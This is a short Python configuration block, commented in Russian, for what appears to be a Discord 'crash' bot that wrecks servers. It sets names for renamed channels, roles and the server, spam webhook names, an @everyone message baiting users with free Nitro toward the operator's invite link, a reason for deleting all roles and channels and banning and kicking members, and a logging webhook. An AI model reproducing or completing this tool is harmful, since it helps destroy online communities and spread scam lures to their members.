...
# подробные настройки
channelsn = 'имя каналов при краше' #имя каналов при краше
rolesn = 'имя ролей при краше'#имя ролей при краше
namen = 'имя серва при краше'#имя сервера при краше
iconn = 'icon.PNG' # Аватарка сервера при краше (можно ставить другую но под именем icon.PNG и в папке бота)
hooknamen = 'имя хуков которые спамят'#имя хуков
botnamen = 'типо имя бота'#тип имя бота
inviten = 'инвайт' # тут ссылка на ваш сервер
spamtextn = f'@everyone\nКто зайдет первый получит бесплатный нитро: {inviten}'
admins = [ID админов] # тут укажи id админов (могут добавлять сервера в вайт лист и менять статус боту), например [123,456,777]
reasonn = 'причина удаления всего' # причина удаления ролей,каналов, бана и кика участников
loghook = 'юрл вебхука который кидает логи'# ссылка на вебхук с логами
